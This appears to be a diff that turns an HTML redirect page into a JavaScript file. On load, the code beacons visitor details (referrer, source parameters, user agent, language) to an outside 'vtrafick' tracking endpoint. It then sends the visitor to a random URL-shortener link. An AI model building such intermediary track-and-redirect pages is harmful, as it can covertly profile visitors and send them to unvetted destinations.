@@ -1,59 +1,82 @@
-<!doctype html>
-<html>
-<body>
-  <!-- التتبع مستقل ولا يعطّل التحويل -->
-  <script type="text/javascript">
-    (function () {
-      var TRACK_ENDPOINT = "https://vtrafick.goooo.workers.dev/track";
+(function () {
+  "use strict";
 
-      function sendTracking() {
-        try {
-          var payload = JSON.stringify({
-            worker: location.hostname || 'unknown',
-            path: location.pathname || '/'
-          });
+  var TRACK_ENDPOINT = "https://vtrafick.goooo.workers.dev/track";
 
-          var blob = new Blob(
-            [payload],
-            { type: 'text/plain;charset=UTF-8' }
-          );
+  function cleanSource(value) {
+    return String(value || "")
+      .replace(/[\u0000-\u001f\u007f]/g, "")
+      .trim()
+      .slice(0, 100);
+  }
 
-          if (
-            navigator.sendBeacon &&
-            navigator.sendBeacon(TRACK_ENDPOINT, blob)
-          ) {
-            return;
-          }
+  function getExplicitSource() {
+    try {
+      var params = new URLSearchParams(window.location.search || "");
+      var keys = ["__ga_source", "utm_source", "src", "source", "ref", "from"];
+      for (var i = 0; i < keys.length; i += 1) {
+        var value = cleanSource(params.get(keys[i]));
+        if (value) return value;
+      }
+    } catch (e) {}
+    return "";
+  }
 
-          fetch(TRACK_ENDPOINT, {
-            method: 'POST',
-            mode: 'cors',
-            headers: {
-              'Content-Type': 'text/plain;charset=UTF-8'
-            },
-            body: payload,
-            keepalive: true
-          }).catch(function () {});
+  function sendTracking() {
+    try {
+      var explicitSource = getExplicitSource();
+      var referrer = document.referrer || "";
+      var source = explicitSource || referrer || "";
+      var sourceKind = explicitSource
+        ? "manual"
+        : referrer
+          ? "referrer"
+          : "unknown";
 
-        } catch (e) {}
+      var payload = JSON.stringify({
+        event: "intermediary-click",
+        worker: location.hostname || "unknown",
+        path: location.pathname || "/",
+        referrer: referrer,
+        source: source,
+        sourceKind: sourceKind,
+        userAgent: navigator.userAgent || "",
+        language: navigator.language || ""
+      });
+
+      var blob = new Blob(
+        [payload],
+        { type: "text/plain;charset=UTF-8" }
+      );
+
+      if (
+        navigator.sendBeacon &&
+        navigator.sendBeacon(TRACK_ENDPOINT, blob)
+      ) {
+        return;
       }
 
-      sendTracking();
-    }());
-  </script>
+      fetch(TRACK_ENDPOINT, {
+        method: "POST",
+        mode: "cors",
+        headers: {
+          "Content-Type": "text/plain;charset=UTF-8"
+        },
+        body: payload,
+        keepalive: true
+      }).catch(function () {});
+    } catch (e) {}
+  }
 
-  <!-- دالة التوجيه الأصلية كما هي -->
-  <script type="text/javascript">
-    function reDirect() {
-    a = location.href = "rush.";
-    b = location.href = "short.";
-    c = location.href = "gy/";
-    d = Math.ceil(Math.random() * 24);
-    a = "https://" + a + b + c + d ;
-    window.location = a
-    }
+  function redirect() {
+    var a = "rush.";
+    var b = "short.";
+    var c = "gy/";
+    var d = Math.ceil(Math.random() * 24);
+    var target = "https://" + a + b + c + d;
+    window.location.replace(target);
+  }
 
-    reDirect();
-  </script>
-</body>
-</html>
+  sendTracking();
+  redirect();
+}());
